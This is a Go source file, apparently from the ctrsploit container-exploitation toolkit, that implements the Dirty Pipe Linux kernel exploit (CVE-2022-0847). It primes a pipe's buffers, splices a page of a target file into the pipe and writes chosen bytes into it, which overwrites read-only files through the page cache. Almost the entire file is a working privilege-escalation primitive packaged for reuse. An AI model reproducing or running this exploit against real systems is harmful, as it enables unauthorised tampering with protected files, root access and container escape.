package dirty_pipe

// borrowed some functions from https://github.com/knqyf263/CVE-2022-0847/blob/main/main.go

import (
	"errors"
	"fmt"
	"github.com/ctrsploit/ctrsploit/helper/splice"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"golang.org/x/sys/unix"
	"os"
	"syscall"
)

const PageSize = 4096

func init() {
	splice.ReexecRegister(DirtyPipe{})
}

type DirtyPipe struct {
}

func (s DirtyPipe) GetExpName() string {
	return "dirty-pipe"
}

func (s DirtyPipe) Write(filepath string, offset int64, content []byte) (err error) {
	f, err := checkArgs(filepath, offset, content)
	if err != nil {
		return
	}
	w, err := preparePipe()
	if err != nil {
		return
	}
	defer w.Close()
	n, err := syscall.Splice(int(f.Fd()), &offset, int(w.Fd()), nil, 1, 0)
	if err != nil {
		err = fmt.Errorf("splice failed: %w", err)
		awesome_error.CheckErr(err)
		return
	}
	if n == 0 {
		err = errors.New("short splice")
		awesome_error.CheckErr(err)
		return
	}

	wrote, err := w.Write(content)
	if err != nil {
		err = fmt.Errorf("write failed: %w", err)
		awesome_error.CheckErr(err)
		return
	}

	if wrote < len(content) {
		err = errors.New("short write")
		awesome_error.CheckErr(err)
		return
	}
	return
}

func preparePipe() (w *os.File, err error) {
	r, w, err := os.Pipe()
	if err != nil {
		err = fmt.Errorf("pipe error: %w", err)
		awesome_error.CheckErr(err)
		return
	}

	pipeSize, err := unix.FcntlInt(w.Fd(), syscall.F_GETPIPE_SZ, -1)
	if err != nil {
		err = fmt.Errorf("fcntl error: %w", err)
		awesome_error.CheckErr(err)
		return
	}

	buf := [PageSize]byte{}
	for i := 0; i < pipeSize/PageSize; i++ {
		if _, err = w.Write(buf[:]); err != nil {
			err = fmt.Errorf("pipe write error: %w", err)
			awesome_error.CheckErr(err)
			return
		}
	}

	for i := 0; i < pipeSize/PageSize; i++ {
		if _, err = r.Read(buf[:]); err != nil {
			err = fmt.Errorf("pipe read error: %w", err)
			awesome_error.CheckErr(err)
			return
		}
	}
	return
}

func checkArgs(filePath string, offset int64, content []byte) (f *os.File, err error) {
	f, err = os.Open(filePath)
	if err != nil {
		err = fmt.Errorf("open failed: %w", err)
		awesome_error.CheckErr(err)
		return
	}

	if offset%PageSize == 0 {
		err = errors.New("sorry, cannot start writing at a page boundary")
		awesome_error.CheckErr(err)
		return
	}

	nextPage := (offset | (PageSize - 1)) + 1
	endOffset := offset + int64(len(content))

	if endOffset > nextPage {
		err = errors.New("sorry, cannot write across a page boundary")
		awesome_error.CheckErr(err)
		return
	}

	fi, err := f.Stat()
	if err != nil {
		err = fmt.Errorf("stat failed: %w", err)
		awesome_error.CheckErr(err)
		return
	}

	if offset > fi.Size() {
		err = errors.New("offset is not inside the file")
		awesome_error.CheckErr(err)
		return
	}

	if endOffset > fi.Size() {
		err = errors.New("sorry, cannot enlarge the file")
		awesome_error.CheckErr(err)
		return
	}
	return
}
